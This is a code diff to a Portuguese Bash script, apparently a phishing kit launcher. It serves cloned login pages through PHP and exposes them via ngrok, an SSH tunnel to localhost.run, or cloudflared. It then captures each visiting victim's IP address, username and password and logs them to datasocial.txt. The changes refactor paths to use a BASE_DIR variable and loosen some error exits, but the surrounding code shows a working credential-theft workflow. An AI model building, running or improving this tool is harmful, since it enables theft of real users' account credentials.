@@ -75,11 +75,13 @@
 # Versão 1.1: Novas opçôes '--auth-key',  '--generate-ssh-key' e '--silent' para ativar o modo silêncioso, e refatoração do código
 #
 
+BASE_DIR="$(dirname "$(realpath "$0")")"
+
 # Carrega variáveis e funções da configuração
-source config/st.sh
-source config/banner.sh
-source config/help.sh
-source config/version.sh
+source $BASE_DIR/config/st.sh
+source $BASE_DIR/config/banner.sh
+source $BASE_DIR/config/help.sh
+source $BASE_DIR/config/version.sh
 
 # Configurações de rede e diretórios
 host="localhost"
@@ -109,8 +111,9 @@ yellow="\e[33;1m"
 blue="\e[34;1m"
 magenta="\e[35;1m"
 cyan="\e[36;1m"
-reset="\e[0m"
-under="\e[4m"
+reset="\e[0m"		# Reset
+u="\e[4m"			# Underline
+b="\e[1m"			# Bold
 
 trap cleanExit INT
 
@@ -127,7 +130,7 @@ cleanExit() {
 
 # Remove o diretório 'www' se ele existir (limpeza antes de iniciar novo serviço)
 removeFiles() {
-	[ -d "$www" ] && rm "$www" -rf
+	[ -d "$BASE_DIR/$www" ] && rm "$BASE_DIR/$www" -rf
 }
 
 # Verifica se o diretório /etc/apt existe, indicando que o ambiente está configurado corretamente.
@@ -148,9 +151,9 @@ copyFiles() {
 
 	removeFiles
 	
-	[ ! -d "$www" ] && mkdir "$www"
-	[ ! -d "logs" ] && mkdir -p logs
-	[ ! -d "pids" ] && mkdir -p pids
+	[ ! -d "$BASE_DIR/$www" ] && mkdir "$BASE_DIR/$www"
+	[ ! -d "$BASE_DIR/logs" ] && mkdir -p $BASE_DIR/logs
+	[ ! -d "$BASE_DIR/pids" ] && mkdir -p $BASE_DIR/pids
 
 	# Verificação extra
 	if ! checkST "services" "$serviceSelected"; then
@@ -158,7 +161,7 @@ copyFiles() {
 		exit 1
 	fi
 	
-	cp $websites/$serviceSelected/* $www -rf
+	cp $BASE_DIR/$websites/$serviceSelected/* $BASE_DIR/$www -rf
 }
 
 # Finaliza todos os processos relacionados aos túneis e servidor local (php, ngrok, ssh e cloudflared).
@@ -166,7 +169,7 @@ killAllProcess() {
 	local pid_files=("php.pid" "ngrok.pid" "ssh.pid" "cloudflared.pid")
 
 	for file in "${pid_files[@]}"; do
-		local path="pids/$file"
+		local path="$BASE_DIR/pids/$file"
 
 		if [ -f "$path" ]; then
 			pid=$(cat "$path")
@@ -191,7 +194,6 @@ checkAuthAccount() {
 				# Verifica Ngrok
 				if ! cat $HOME/.config/ngrok/ngrok.yml > /dev/null 2>&1; then
 					echo -e "${red}[!] Configure o ngrok com a chave da sua conta antes de usá-lo.${reset}"
-					exit 1
 				fi
 				;;
 
@@ -199,13 +201,22 @@ checkAuthAccount() {
 				# Verifica SSH
 				if [ ! -f $HOME/.ssh/id_rsa ] || [ ! -f $HOME/.ssh/id_rsa.pub ] ; then
 					echo -e "${red}[!] Gere uma chave SSH com 'ssh-keygen' antes de usar o tunnel SSH (localhost.run).${reset}"
-					exit 1
 				fi
 				;;
 			*)
-				echo -e "${red}Túnel inválido.${reset}"
-				exit 1;;
+				echo -e "${red}Túnel inválido.${reset}";;
 		esac
+	fi
+}
+
+checkExecutable() {
+	local executable="$1"
+	local dirname="$2"
+
+	if [[ -f "$dirname/$executable" ]]; then
+		return 0
+	else
+		return 1
 	fi
 }
 
@@ -214,8 +225,6 @@ generateSshKey() {
 	local email="$1"
 
 	ssh-keygen -t rsa -b 4096 -C $email
-
-	exit 0
 }
 
 
@@ -254,15 +263,14 @@ listenServerLocalhost() {
 
 	if ! checkST "services" "$serviceSelected"; then
 		echo -e "${red}Serviço ${yellow}$serviceSelected ${red}inválido.${reset}"
-		exit 1
 	fi
 
 	copyFiles "$serviceSelected"
 
 	killAllProcess
 
-	php -S "$host:$port" -t "$www" > logs/php.log 2>&1 & echo $! > pids/php.pid
-	link=$(waitTunnelLink "logs/php.log" "http://[-1-9a-z:]*")
+	php -S "$host:$port" -t "$www" > $BASE_DIR/logs/php.log 2>&1 & echo $! > $BASE_DIR/pids/php.pid
+	link=$(waitTunnelLink "$BASE_DIR/logs/php.log" "http://[-1-9a-z:]*")
 	showTunnelLink "localhost" "$link"
 }
 
@@ -340,21 +348,21 @@ listenServerPublic() {
 	case "$tunnelSelected" in
 		ngrok)
 			checkAuthAccount "ngrok"
-			bin/ngrok http $port --log=stdout > logs/ngrok.log 2>&1 & echo $! > pids/ngrok.pid
-			link=$(waitTunnelLink "logs/ngrok.log" "url=\Khttps://[^\s]+")
+			$BASE_DIR/bin/ngrok http $port --log=stdout > $BASE_DIR/logs/ngrok.log 2>&1 & echo $! > $BASE_DIR/pids/ngrok.pid
+			link=$(waitTunnelLink "$BASE_DIR/logs/ngrok.log" "url=\Khttps://[^\s]+")
 			;;
 		ssh)
 			checkAuthAccount "ssh"
 		
-			ssh -i $HOME/.ssh/id_rsa -R 80:localhost:$port ssh.localhost.run > logs/ssh.log 2>&1 & echo $! > pids/ssh.pid
+			ssh -i $HOME/.ssh/id_rsa -R 80:localhost:$port ssh.localhost.run > $BASE_DIR/logs/ssh.log 2>&1 & echo $! > $BASE_DIR/pids/ssh.pid
 			
-			link=$(waitTunnelLink "logs/ssh.log" "https://[a-z0-9]+\.lhr\.life" | head -n 1)
+			link=$(waitTunnelLink "$BASE_DIR/logs/ssh.log" "https://[a-z0-9]+\.lhr\.life" | head -n 1)
 			;;
 			
 		cloudflared)
-			cloudflared tunnel --url http://$host:$port > logs/cloudflared.log 2>&1 & echo $! > pids/cloudflared.pid
+			cloudflared tunnel --url http://$host:$port > $BASE_DIR/logs/cloudflared.log 2>&1 & echo $! > $BASE_DIR/pids/cloudflared.pid
 
-			link=$(waitTunnelLink "logs/cloudflared.log" "https://\S*trycloudflare.com")
+			link=$(waitTunnelLink "$BASE_DIR/logs/cloudflared.log" "https://\S*trycloudflare.com")
 			;;
 			
 		*)
@@ -368,7 +376,7 @@ listenServerPublic() {
 
 # Aguarda a criação do arquivo de IP e exibe o IP da nova conexão quando detectado.
 getIp() {
-	local ip_file="$www/ip.txt"
+	local ip_file="$BASE_DIR/$www/ip.txt"
 	local spinner='|/-\'
 	local i=0
 
@@ -393,8 +401,8 @@ getIp() {
 getData() {
 	getIp
 
-	local data_file="$www/src/dados.txt"
-	local log_file="logs/datasocial.txt"
+	local data_file="$BASE_DIR/$www/src/dados.txt"
+	local log_file="$BASE_DIR/logs/datasocial.txt"
 	local spinner='|/-\'
 	local i=0
 
@@ -407,7 +415,7 @@ getData() {
 		sleep 0.5
 	done
 
-	[ ! -d logs ] && mkdir logs
+	[ ! -d $BASE_DIR/logs ] && mkdir $BASE_DIR/logs
 
 	cat "$data_file" > $log_file
 
@@ -422,7 +430,7 @@ getData() {
 		echo -e "    ${yellow}[Usuário]${reset}	$usuario"
 		echo -e "    ${yellow}[Senha]${reset}   	$senha"
 
-		printf "\r\e[K${blue}[+]${reset} Seu log está in: ${magenta}logs/datasocial.txt${reset}\n"
+		printf "\r\e[K${blue}[+]${reset} Seu log está in: ${magenta}$BASE_DIR/logs/datasocial.txt${reset}\n"
 	fi
 
 	tput cnorm
@@ -462,9 +470,9 @@ interactiveMenu() {
 
 	while true; do
 		if [[ -n "$selectedService" ]]; then
-			prompt="${reset}${under}dsf${reset} ${reset}service(${red}${selectedService}${reset}) > "
+			prompt="dsf service($selectedService) > "
 		else
-			prompt="${reset}${under}dsf${reset} > "
+			prompt="dsf > "
 		fi
 	
 		read -e -a cmd_parts -p "$(echo -e "$prompt")"
@@ -509,7 +517,12 @@ interactiveMenu() {
 
 				if [[ "$arg" == "tunnel" && -n "$target" ]]; then
 					if checkST "tunnels" "$target"; then
-						selectedTunnel="$target"
+						if checkExecutable "$target" "$BASE_DIR/bin" || checkExecutable "$target" "$PREFIX/bin"; then
+							selectedTunnel="$target"
+						else
+							echo "Túnel não existe."
+							continue
+						fi
 					else
 						echo "Túnel não encontrado."
 					fi
@@ -610,6 +623,7 @@ while [ -n "$1" ]; do
 
 		--silent) silentKey=1;;
 		-i|--interactive) interactiveMenu;;
+		# --test) echo "base: $BASE_DIR1";;
 		*) 
 			# Caso a opção fornecida não seja válida
 			echo "Opção $1 inválida!"
